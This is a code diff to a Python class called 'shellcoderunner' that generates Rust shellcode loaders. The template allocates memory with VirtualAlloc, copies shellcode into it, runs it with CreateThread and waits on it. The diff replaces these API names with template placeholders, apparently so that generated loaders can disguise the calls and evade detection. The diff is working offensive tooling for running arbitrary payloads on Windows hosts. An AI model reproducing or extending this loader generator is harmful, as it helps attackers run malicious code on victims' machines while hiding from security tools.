@@ -21,7 +21,7 @@ class shellcoderunner:
         return """
     {transformers}
     unsafe {{
-        let func_addr = VirtualAlloc(
+        let func_addr = {VirtualAlloc}(
             ptr::null_mut(),
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
@@ -30,7 +30,7 @@ class shellcoderunner:
 		
         std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func_addr as *mut u8, shellcode.len());
 
-        let h_thread = CreateThread( 
+        let h_thread = {CreateThread}( 
             ptr::null_mut(), 
             0,
             Some(std::mem::transmute(func_addr)), 
@@ -39,6 +39,6 @@ class shellcoderunner:
             ptr::null_mut(), 
         );
 
-        WaitForSingleObject(h_thread, 0xFFFFFFFF); 
+        {WaitForSingleObject}(h_thread, 0xFFFFFFFF); 
     }}
 """
